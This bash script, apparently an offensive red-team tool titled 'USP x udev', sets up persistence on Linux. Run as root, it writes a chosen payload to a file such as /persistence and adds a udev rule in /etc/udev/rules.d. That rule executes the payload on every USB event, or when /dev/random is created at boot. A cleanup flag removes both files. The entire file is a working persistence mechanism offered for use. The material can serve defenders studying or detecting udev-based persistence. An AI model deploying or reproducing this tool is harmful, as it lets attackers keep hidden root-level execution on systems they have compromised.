#!/bin/bash

cat << "EOF"

                                              .,;,.
                                            'KMMMMM0.
                                ,oOXNWWWWWWWMMMMMMMMX
                              cXMWOl::::::::xMMMMMMMo
                            cXMWd.           'oO0ko.
   .;lll:'                cXMWd.
.oNMMMMMMMWx.           lNMWd.                                         ,
NMMMMMMMMMMMW:       .lNMNo.   USP x udev: Persistance is the key     .MWOl.
OMMMMMMMMMMMMMWOOOOOOKWMMMKOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MMMMMNx:.
kMMMMMMMMMMMMMNxxxxxxxxxxxxxxxxxONMMMXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxOMMMMMKd,
.XMMMMMMMMMMMW;                   ,0MMO'                               .MNx:.
 cKMMMMMMMNd.                      'OMMO,                              .
   .,:c:,.                           ,OMM0'
                                       'OMM0,          dXXXXXXXK.
                                         'OMMKxlllllllcXMMMMMMMM.
                                           .:x0XXXXXXXXWMMMMMMMM.
                                                       OMMMMMMMM.
                                                       .,,,,,,,,

EOF

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No color

check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] Error: This script must be run as root${NC}"
        exit 1
    fi
}

write_udev_rule() {
    local rule_content="$1"
    local rules_name="$2"
    local rule_path="/etc/udev/rules.d/$rules_name"

    echo "$rule_content" > "$rule_path"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Added udev rule: $rules_name${NC}"
    else
        echo -e "${RED}[!] Error writing udev rule: $rules_name${NC}"
        exit 1
    fi
}

write_payload() {
    local payload_content="$1"
    local filename="$2"

    echo "$payload_content" > "$filename"
    chmod 755 "$filename"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Added persistence payload: $filename${NC}"
    else
        echo -e "${RED}[!] Error writing payload file: $filename${NC}"
        exit 1
    fi
}

cleanup() {
    local filename="$1"
    local rules_name="$2"

    rm -f "$filename"
    echo -e "${GREEN}[+] Removed payload file: $filename${NC}"

    rm -f "/etc/udev/rules.d/$rules_name"
    echo -e "${GREEN}[+] Removed udev rule: $rules_name${NC}"
}

main() {
    check_root

    local filename="/persistence"
    local rules_name="75-persistence.rules"
    local usb=false
    local random=false
    local cleanup=false
    local payload=""

    while [[ $# -gt 0 ]]; do
        case $1 in
            -f|--filename)
                filename="$2"
                shift 2
                ;;
            -p|--payload)
                payload="$2"
                shift 2
                ;;
            -r|--rulesname)
                rules_name="$2"
                shift 2
                ;;
            -usb)
                usb=true
                shift
                ;;
            -random)
                random=true
                shift
                ;;
            -c|--cleanup)
                cleanup=true
                shift
                ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${NC}"
                exit 1
                ;;
        esac
    done

    if $cleanup; then
        cleanup "$filename" "$rules_name"
        exit 0
    fi

    if ! $usb && ! $random; then
        echo -e "${RED}[!] Please specify a persistence method -usb or -random${NC}"
        exit 1
    fi

    if [ -z "$payload" ]; then
        echo -e "${RED}[!] Error: Payload file not specified${NC}"
        exit 1
    fi

    if [ ! -f "$payload" ]; then
        echo -e "${RED}[!] Error: Payload file not found: $payload${NC}"
        exit 1
    fi

    payload_content=$(cat "$payload")

    if $usb; then
        echo -e "${GREEN}[+] Adding USB persistence${NC}"
        rule_content="SUBSYSTEMS==\"usb\", RUN+=\"$filename\""
        write_payload "$payload_content" "$filename"
        write_udev_rule "$rule_content" "$rules_name"
    fi

    if $random; then
        echo -e "${GREEN}[+] Adding /dev/random persistence${NC}"
        rule_content="ACTION==\"add\", ENV{MAJOR}==\"1\", ENV{MINOR}==\"8\", RUN+=\"$filename\""
        write_payload "$payload_content" "$filename"
        write_udev_rule "$rule_content" "$rules_name"
    fi
}

main "$@"
